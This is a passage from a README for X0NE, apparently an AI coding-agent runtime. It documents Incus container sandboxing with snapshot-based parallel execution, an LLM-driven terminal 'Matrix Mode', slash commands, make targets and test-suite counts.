x0ne-runtime speaks the standard MCP stdio transport:

```bash
# Start as MCP server (stdio transport)
x0ne-runtime --mode mcp

# Start as HTTP server (for REST clients)
x0ne-runtime --mode http --bind 127.0.0.1:7898
```

### HTTP bridge (non-MCP tools)

For tools that don't support MCP, use the HTTP API:

```bash
curl -s http://localhost:7898/execute \
  -H "Authorization: Bearer $(cat "$XDG_RUNTIME_DIR/x0ne/runtime-7898.token")" \
  -H "Content-Type: application/json" \
  -d '{"type": "ReadFile", "path": "./src/main.rs"}' | jq
```

> **Security:** a bearer token is always required. Without `auth_token` under
> `[runtime.http]`, one is generated at startup into a 0600 file whose path is
> printed on stderr. `Host` must be a loopback name with the bound port (or in
> `allowed_hosts`); browser `Origin`s are refused unless in `allowed_origins`.

---

## Container Isolation, Incus Setup

X0NE can execute code inside ephemeral [Incus](https://linuxcontainers.org/incus/) (LXC) containers for full process isolation. Two modes are supported: **local** (via Unix socket) and **remote** (via TLS, recommended for production, especially with btrfs for instant CoW snapshots).

```bash
make run-incus-runtime    # build, deploy x0ne-runtime to the Incus container, run the CLI on the host
make run-incus            # run x0ne itself inside a throwaway Incus container (binaries + ~/x0ne-work only)
```

### Mode 1, Local Incus (Unix socket)

No configuration needed if Incus is installed locally:

```bash
# Install Incus
sudo apt install incus
sudo incus admin init   # accept defaults

# Verify
incus list
```

x0ne-runtime will connect via `/run/incus/unix.socket` automatically.

---

### Mode 2, Remote Incus server (btrfs, recommended for production)

A remote Incus server backed by **btrfs** allows container creation via **Copy-on-Write snapshots** in under 200ms. This is the fastest and most scalable sandboxing option.

#### Step 1, Enable the Incus REST API on the server

```bash
ssh your-incus-server "incus config set core.https_address '0.0.0.0:8443'"

# Verify it's listening
ssh your-incus-server "ss -tlnp | grep 8443"
```

#### Step 2, Generate a client certificate for X0NE

```bash
mkdir -p ~/.config/x0ne/incus

openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 \
  -keyout ~/.config/x0ne/incus/prod-infra.key \
  -out    ~/.config/x0ne/incus/prod-infra.crt \
  -days   3650 -nodes \
  -subj   "/CN=x0ne-client"
```

#### Step 3, Trust the client cert on the server

```bash
# Server generates a one-time token
ssh your-incus-server "incus config trust add x0ne"
# → prints a base64 token

# Add the remote using that token
incus remote add prod-infra https://<SERVER_IP>:8443 \
  --accept-certificate \
  --auth-type tls \
  --token <TOKEN_FROM_ABOVE>
```

You should see: `Client certificate now trusted by server: prod-infra`

#### Step 4, Retrieve the server CA certificate

```bash
ssh your-incus-server "cat /var/lib/incus/server.crt" \
  > ~/.config/x0ne/incus/prod-infra-ca.crt
```

#### Step 5, Smoke test

```bash
# List containers on the remote
incus list prod-infra:

# Launch an ephemeral container (instant on btrfs)
incus launch images:alpine/edge prod-infra:x0ne-test --ephemeral
incus exec prod-infra:x0ne-test -- echo "incus-ok"
incus delete prod-infra:x0ne-test --force
```

---

### x0ne-runtime.toml, Incus configuration

```toml
[sandbox]
# "podman" (default) or "incus"
default_backend = "incus"

[sandbox.incus]
# Remote configured via `incus remote add`
default_remote = "prod-infra"

# Allowlist, empty list = all images denied (fail-closed)
allowed_images = [
  "images:ubuntu/24.04",
  "images:alpine/edge",
  "images:debian/12",
]

# Resource defaults (LLM can request less, never more)
default_memory_mb    = 512
default_cpu_limit    = 1
default_disk_mb      = 2048
default_timeout_secs = 60

# Security hardening
security_profile   = "default"   # AppArmor profile
no_new_privileges  = true
default_network    = "none"      # "none" | "bridge"

# Remote connection (TLS mutual auth)
[sandbox.incus.remotes.prod-infra]
url  = "https://192.0.2.5:8443"
cert = "~/.config/x0ne/incus/prod-infra.crt"
key  = "~/.config/x0ne/incus/prod-infra.key"
ca   = "~/.config/x0ne/incus/prod-infra-ca.crt"

# Local socket (no TLS needed)
[sandbox.incus.remotes.local]
url  = "unix:///run/incus/unix.socket"
```

---

### Why btrfs matters

On a btrfs-backed Incus server, new containers are created via **Copy-on-Write** from a base image snapshot. This means:

| Backend | Container start time |
|---------|---------------------|
| ext4 (full copy) | 5–30 seconds |
| btrfs CoW snapshot | **< 200ms** |

For X0NE agents that spawn many isolated containers (per-task sandboxing, multi-agent workloads), this is the difference between a usable and an unusable system.

To use an existing container as a CoW base template, create it once and snapshot it:

```bash
# Create a pre-warmed template on the btrfs server
incus launch images:ubuntu/24.04 prod-infra:template-base
incus exec prod-infra:template-base -- apt-get install -y python3 nodejs
incus snapshot prod-infra:template-base ready

# X0NE will clone from this snapshot instantly
# (set base_snapshot = "template-base/ready" in RunIncus)
```

---

## Parallel Worlds & Snapshot Architecture

> **The LLM thinks in branches, not sequences.**

The Incus backend unlocks a fundamentally different execution model: instead of trying one solution at a time and rolling back on failure, X0NE agents can **fork the world**, spawning N isolated containers simultaneously, each exploring a different approach, then picking the winner.

### The three primitives

#### `RunIncus`, single ephemeral container

A container that lives only for the duration of the task. Files are injected before execution, collected after. The container is automatically deleted when the task ends regardless of outcome (RAII guard).

```json
{
  "type": "RunIncus",
  "image": "images:ubuntu/24.04",
  "remote": "prod-infra",
  "command": ["sh", "-c", "cargo test 2>&1"],
  "files": {
    "src/lib.rs": "pub fn add(a: i32, b: i32) -> i32 { a + b }"
  },
  "collect_files": ["/workspace/test-report.json"],
  "memory_mb": 512,
  "timeout_secs": 60
}
```

#### `RunIncusGroup`, N containers in parallel

All tasks launch simultaneously (bounded by `max_parallel`). Results come back as a ranked list. Ideal for: running the same test suite across N OS versions, benchmarking N algorithm variants, or trying N patches and picking the first one that passes.

```json
{
  "type": "RunIncusGroup",
  "remote": "prod-infra",
  "max_parallel": 4,
  "tasks": [
    {
      "id": "ubuntu-24",
      "image": "images:ubuntu/24.04",
      "command": ["sh", "-c", "python3 --version && python3 run_tests.py"]
    },
    {
      "id": "alpine",
      "image": "images:alpine/edge",
      "command": ["sh", "-c", "python3 --version && python3 run_tests.py"]
    },
    {
      "id": "debian-12",
      "image": "images:debian/12",
      "command": ["sh", "-c", "python3 --version && python3 run_tests.py"]
    }
  ]
}
```

Response:
```json
{
  "total": 3,
  "succeeded": 2,
  "failed": 1,
  "results": [
    { "id": "ubuntu-24",  "exit_code": 0, "stdout": "...", "duration_ms": 3200 },
    { "id": "alpine",     "exit_code": 1, "stdout": "...", "duration_ms": 1800 },
    { "id": "debian-12",  "exit_code": 0, "stdout": "...", "duration_ms": 2900 }
  ]
}
```

#### `base_snapshot`, CoW instant clone

Instead of launching from a raw image (slow pull), clone from a pre-warmed snapshot in < 200ms. Each clone is a fully independent container, writes in one don't affect the others.

```json
{
  "type": "RunIncusGroup",
  "remote": "prod-infra",
  "tasks": [
    { "id": "solution-a", "base_snapshot": "template-base/ready", "command": ["python3", "solution_a.py"] },
    { "id": "solution-b", "base_snapshot": "template-base/ready", "command": ["python3", "solution_b.py"] },
    { "id": "solution-c", "base_snapshot": "template-base/ready", "command": ["python3", "solution_c.py"] }
  ]
}
```

All three clones start simultaneously from the same snapshot.

### Rollback & state preservation

A container can save its state before a risky operation using `snapshot_on_exit`:

```json
{ "type": "RunIncus", "snapshot_on_exit": "before-migration", ... }
```

If the next step fails, the LLM can roll back by launching from that snapshot:

```json
{ "type": "RunIncus", "base_snapshot": "my-container/before-migration", ... }
```

This gives X0NE agents a **stateful, reversible execution environment**, equivalent to git branches but for running processes.

### Agent pattern: Parallel Worlds

The recommended pattern for solving non-trivial coding problems:

```
1. CreateSnapshot  → checkpoint current workspace state
2. RunIncusGroup   → try N solutions in parallel (all from same base_snapshot)
3. Inspect results → pick winner (exit_code=0, fastest, smallest output, ...)
4. Apply winner    → copy winning files back to workspace
5. Verify          → RunIncus (one final run to confirm)
```

Covered by the `incus` scenario file (13 cases, run against a real Incus server by `make scenarios-incus`): parallel groups, CoW clone from a snapshot, env injection, memory cap, and RAII cleanup (no leaked container after the run).

---

## Matrix Mode

> **The LLM is the GPU.**

Matrix Mode is an experimental display paradigm where the LLM takes **full, direct control of the terminal**. Instead of producing markdown or plain text, the LLM outputs structured JSON frames, character grids with per-cell styling, and the orchestrator renders them in a raw terminal canvas. The result is an LLM-native graphical interface: dashboards, games, editors, forms, art, all generated and driven entirely by the model.

**No UI framework. No HTML. No widgets library.** The LLM decides every pixel.

```bash
x0ne --matrix          # launch matrix mode
make run-matrix        # build + launch
```

### How it works

```
┌──────────────┐     JSON frame      ┌──────────────┐     raw terminal     ┌──────────────┐
│              │  ───────────────►   │              │  ──────────────►    │              │
│     LLM      │  <matrix>...</matrix> │  orchestrator │  crossterm render   │   terminal   │
│              │  ◄───────────────   │              │  ◄──────────────    │              │
│  (the brain) │     user input      │  (the GPU)   │     keypress/click  │  (the screen) │
└──────────────┘     as JSON         └──────────────┘                     └──────────────┘
```

1. The LLM outputs `<matrix>{ JSON }</matrix>` frames containing a character grid
2. The orchestrator renders the grid in a fullscreen raw terminal (crossterm alternate screen)
3. User input (keys, mouse clicks, form submissions) is captured and sent back as JSON
4. The LLM receives the input and responds with a new frame
5. Repeat, the LLM drives the display loop

### Features

| Feature | Description |
|---------|-------------|
| **Character grid** | LLM outputs `rows: [...]`, each string is one row of the display |
| **Per-cell styling** | `styles: [...]`, hex colors (`#00dfa8`), bold, dim, fg/bg per region |
| **Editable fields** | `fields: [...]`, inline text inputs with Tab navigation, Enter to submit |
| **Mouse support** | Click events sent as `{"type": "click", "row": R, "col": C, "row_text": "..."}` |
| **Input modes** | `line` (readline), `char` (single key), `fields` (form), `none` (display only) |
| **Multi-action chaining** | LLM can send multiple `<action>` blocks, executed sequentially, results batched |
| **Watch / Crontab** | `<watch>` blocks for scheduled recurring actions with trigger conditions |
| **Slash commands** | `/clear` `/cost` `/help` `/quit` `/undo`, intercepted before LLM |
| **Token tracking** | Live token count in status bar and spinner |
| **Dual consoles** | Macro log (left, actions sent) + Micro log (right, results received) |
| **Streaming** | Live character count in status bar while the LLM generates the frame |
| **Frame caching** | On LLM error, redisplays last valid frame and retries silently |
| **Progressive reveal** | Frames render row-by-row with a cascade animation |
| **Bridge integration** | LLM can execute `x0ne-runtime` actions (read files, run commands) and display results |
| **Prompt caching** | Anthropic prompt caching enabled, 2x faster, 90% cheaper after 1st call |
| **Multi-provider** | Interactive picker at startup: Anthropic, OpenAI/Groq/OpenRouter, Ollama |
| **Anti-hallucination** | System prompt enforces real data only, no fabricated system output |

### Frame format

```json
{
  "rows": [
    "╔══════════════════════╗",
    "║  Hello, Matrix!      ║",
    "╚══════════════════════╝"
  ],
  "styles": [
    {"row": 1, "col": 4, "len": 14, "fg": "#00dfa8", "bold": true}
  ],
  "fields": [
    {"id": "name", "row": 3, "col": 8, "len": 20, "value": "", "placeholder": "type here"}
  ],
  "input_mode": "fields",
  "cursor": {"row": 3, "col": 8},
  "status": "Ready",
  "clear": true
}
```

### Input events (sent to LLM as JSON)

| Event | Format |
|-------|--------|
| Init | `{"type": "init"}` or `{"type": "init", "request": "build a snake game"}` |
| Key press | `{"type": "key", "value": "a"}` |
| Line input | `{"type": "line", "value": "hello"}` |
| Mouse click | `{"type": "click", "row": 5, "col": 12}` |
| Form submit | `{"type": "submit", "fields": {"name": "John", "age": "25"}}` |
| Resize | `{"type": "resize", "cols": 120, "rows": 40}` |
| Tick | `{"type": "tick"}` (in `none` mode) |

### What can you build?

The LLM can draw **anything** that fits in a character grid:

- **System dashboards**, CPU/RAM/disk bars, process tables, network stats
- **Games**, Snake, Tetris, Minesweeper, roguelikes, text adventures
- **File browsers**, navigate directories, preview files
- **Editors**, text editing with syntax highlighting
- **Forms**, multi-field input with validation
- **Art**, ASCII art, animations, visualizers
- **Chat UIs**, messaging interfaces, chatbot frontends

### CLI options

```bash
x0ne --matrix                        # interactive provider/model/interface picker
x0ne --matrix --provider ollama      # skip to Ollama directly
x0ne --matrix --provider anthropic   # skip to Anthropic directly
x0ne --matrix --provider openai-compat  # OpenAI/Groq/OpenRouter
```

---

## X0NE.md, Project Memory

Like `CLAUDE.md`, a markdown file loaded automatically at boot and injected into the system prompt. The LLM knows your project conventions.

```markdown
# X0NE.md
- This is a Rust workspace with two crates: x0ne-runtime and x0ne-orchestrator.
- Always run `cargo check` after modifications.
- Use snake_case for all identifiers.
- Never modify files in the `vendor/` directory.
```

Searched locations (in order):
1. `X0NE.md` in project root
2. `.x0ne/X0NE.md`
3. `.x0ne/rules.md`
4. `.x0ne/rules/*.md` (all files, sorted alphabetically)

---

## Non-Interactive Mode

Run a single prompt and exit, for CI/CD, scripts, and piping:

```bash
# Single prompt
x0ne -p "list all TODO comments in the codebase"

# Pipe stdin as context
cat stacktrace.log | x0ne --stdin -p "explain and fix"

# @file references, inject file contents inline
x0ne -p "review @src/auth.rs for security issues"

# JSON output for scripting
x0ne -p "what is the OS" --output-format json
```

---

## Autonomous Mode

Continuous agent loop, the LLM works independently with auto git checkpoints:

```bash
x0ne --auto-mode                          # default 50 iterations
x0ne --auto-mode --max-iterations 100     # custom limit
```

Every 10 iterations, X0NE auto-commits (`git add -A && git commit`). Ctrl+C to stop gracefully.

---

## Slash Commands

| Command | Description |
|---------|-------------|
| `/help` | Show all commands |
| `/history` | Full expanded conversation history (actions, results, messages) |
| `/export [name]` | Export session as JSON (for audit & LLM fine-tuning) |
| `/matrix [request]` | Enter Matrix Mode, optional request to auto-build a dashboard |
| `/diff` | `git diff --stat` |
| `/log [n]` | `git log --oneline` (default 20) |
| `/commit [msg]` | `git add -A` + `git commit` |
| `/undo` | restore the files of the agent's last write, from the snapshot taken just before it (git untouched) |
| `/stash [pop]` | `git stash push/pop` |
| `/read <file>` | Inject file into context |
| `/clear` | Reset conversation |
| `/cost` | Token usage & estimated cost |
| `/auto` | Toggle auto-confirm |
| `/compact` | Toggle compact system prompt |
| `/until <cmd>` | Goal-driven loop, agent retries until command passes (exit 0) |
| `/snapshot <name>` | Save file state |
| `/restore <name>` | Restore file state |
| `/actions` | List all x0ne-runtime actions |
| `/policy <json>` | Check if an action would be allowed by the policy engine |
| `/pulse` | System health dashboard |
| `/target [mode]` | Show or switch execution target (local/sandbox/ssh) |
| `/handles` | List active async handles |
| `/check <id>` | Check/drain handle events |
| `/stop <id>` | Cancel an active handle |
| `/quit` | Exit |

---

## TUI keybindings

| Key | Action |
|-----|--------|
| `F1` | Help |
| `F2` | Setup wizard |
| `F3` | Clear conversation |
| `F4` | Switch to Ollama |
| `F5` | Switch to Anthropic |
| `F6` | Switch to OpenAI-compat |
| `F7` | Toggle raw JSON data view |
| `F8` | Toggle auto-confirm |
| `F9` | Toggle compact prompt |
| `Tab` | Collapse/expand console |
| `Esc × 2` | Cancel current action |
| `PgUp / PgDn` | Scroll data pane |
| `Shift+PgUp/PgDn` | Scroll console |
| `Ctrl+C` | Quit |

---

## Make targets

```
make build             build debug
make release           build release
make install           install to ~/.cargo/bin
make run               local mode (CLI)
make run-tui           local mode (TUI)
make run-matrix        matrix mode (LLM-controlled canvas)
make run-mcp           run x0ne-runtime as MCP server
make run-incus         x0ne inside a throwaway Incus container (binaries + ~/x0ne-work only)
make run-podman        same guarantees as run-incus, on Podman
make run-incus-runtime CLI on the host, x0ne-runtime in the Incus sandbox
make run-incus-matrix  Incus container (isolated Matrix mode)
make test              unit tests only
make test-all          full suite: unit + scenarios + Incus
make test-matrix       run matrix mode unit tests only
make test-desktop      desktop/Wayland tests (requires grim, wlrctl, wtype)
make scenarios-incus   Incus scenarios only
make dev               watch + rebuild on save
make demo              send 3 scripted commands for quick testing
make demo-undo         "Undo Agent", agent destroys, X0NE restores in ~3 ms
make demo-undo-fast    same as above, no pauses (for screencasts)
```

---

## Testing

Three-tier test suite, all run without an LLM:

```bash
make test-all    # runs everything
```

| Tier | What | Count (measured 2026-10-05) |
|------|------|-------|
| **Unit and integration tests** | `cargo test --workspace --all-features` (doctests included) | 2 931 tests: 2 926 passed, 4 ignored, 1 known failure (`a_real_artifact_is_still_served_over_http`, under investigation) |
| **Scenario suite** | JSON-driven in-process harness (`x0ne-scenario-runner`) | 186 cases across 13 categories |
| **Incus integration** | Real containers on a remote Incus server (`make scenarios-incus`) | 13 cases |

### Scenario categories

| Category | Tests | Description |
|----------|-------|-------------|
| `composites` | 10 | DefinePrimitive/CallPrimitive lifecycle |
| `edge_cases` | 20 | Empty paths, nonexistent files, zero timeouts |
| `happy_path` | 39 | Full CRUD, git, system info, memory |
| `human_interaction` | 12 | AskHuman, Confirm, QCM with scripted responses |
| `malformed` | 18 | Invalid JSON, missing fields, wrong types |
| `pipeline` | 5 | Sequential multi-step execution |
| `pipeline_advanced` | 12 | Parallel, stop_on_error, snapshot, nested rejection |
| `policy_violations` | 22 | Path traversal, forbidden commands, SSRF, secrets |
| `qcm` | 16 | AskMultipleChoice: skip, other, out-of-range |
| `scripted_functions` | 10 | Rhai scripted primitives |
| `snapshots` | 9 | Create/restore/delete/list snapshots |
| `ssh_exec` | 6 | SshExec argument handling |
| `try_rollback` | 7 | Transactional execution with automatic rollback |

`desktop.json` (2 cases) only runs with `--desktop`; `incus.json` (13 cases) is the Incus tier above.

### Incus pre-flight

When `--incus` is set with a non-local remote, the scenario runner **probes connectivity** with a 5s timeout before running any container tests. If the remote is unreachable, Incus tests are skipped with a warning instead of failing with 20s timeouts per test:

```
⚠  Incus remote 'prod-infra' is unreachable, skipping Incus scenarios
   Fix: incus remote list  |  check server at remote 'prod-infra'
```

---

## Project layout

```
x0ne/
├── x0ne-mcp/                      # Shared MCP / JSON-RPC plumbing (wire-level only)
│   └── src/
│       ├── jsonrpc.rs             # JSON-RPC 2.0 types + error codes
│       ├── transport.rs           # Line-delimited stdio transport
│       └── child_client.rs        # Spawn + speak MCP to a downstream server
├── x0ne-runtime/                  # Executor crate, zero AI, typed primitives only
│   ├── src/
│   │   ├── action.rs              # Action enum (122 variants)
│   │   ├── result.rs              # ActionResult / ActionOutput
│   │   ├── policy.rs              # PolicyEngine
│   │   ├── config.rs              # AppConfig
│   │   ├── mcp/                   # MCP server (tools/list, tools/call…)
│   │   └── executor/              # One file per primitive category
│   ├── bin/x0ne-scenario-runner/  # JSON-driven test harness binary
│   └── tests/scenarios/           # 175+ JSON test scenarios
├── x0ne-orchestrator/             # Orchestrator library + headless serve binary
│   ├── src/
│   │   ├── lib.rs                 # Public modules (consumed by x0ne-code)
│   │   ├── main.rs                # `x0ne-orchestrator` headless HTTP/SSE binary
│   │   ├── mcp_server.rs          # MCP gateway, proxifies runtime + native sysaicalls
│   │   ├── tui_mode.rs            # TUI frontend (ratatui)
│   │   ├── matrix_mode.rs         # Matrix mode (LLM-controlled canvas)
│   │   ├── agent_loop.rs          # LLM → parse → dispatch → collapse cycle
│   │   │                          # Orchestrator-first Pipeline interception
│   │   ├── loop_tracker.rs        # T11 repeated-action circuit breaker
│   │   ├── sysaicalls.rs          # SpawnWorld / WaitAgent / ListAgents dispatch
│   │   ├── incus_actions.rs       # Host-side Incus dispatch (privilege boundary)
│   │   ├── subagent.rs            # Parallel isolated agent tasks
│   │   ├── session.rs             # JSONL audit logger
│   │   ├── terminal.rs            # Display formatting, /history renderer
│   │   ├── project.rs             # Project detection, X0NE.md, @file, indexing
│   │   ├── slash.rs               # Slash commands (/commit, /export, /matrix…)
│   │   ├── config.rs              # Config management (TOML + env)
│   │   └── bridge.rs              # stdio/HTTP/sandbox bridge
│   └── x0ne-orchestrator.toml
└── x0ne-code/                      # `x0ne` CLI binary, wraps the orchestrator library
    └── src/
        └── main.rs                # `x0ne` entry point (CLI/TUI/Matrix, -p, --auto, --stdin)

~/.x0ne/                       # User data directory
├── sessions/                  # Auto JSONL audit logs (per session)
│   └── 2026-04-16_02-12.jsonl
├── exports/                   # Manual JSON exports (/export)
│   └── session_2026-04-16.json
├── history                    # readline history
└── config/                    # User overrides
```

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.

## Security

See [SECURITY.md](SECURITY.md) for the security model and vulnerability reporting.

## License

Apache 2.0, see [LICENSE](LICENSE).
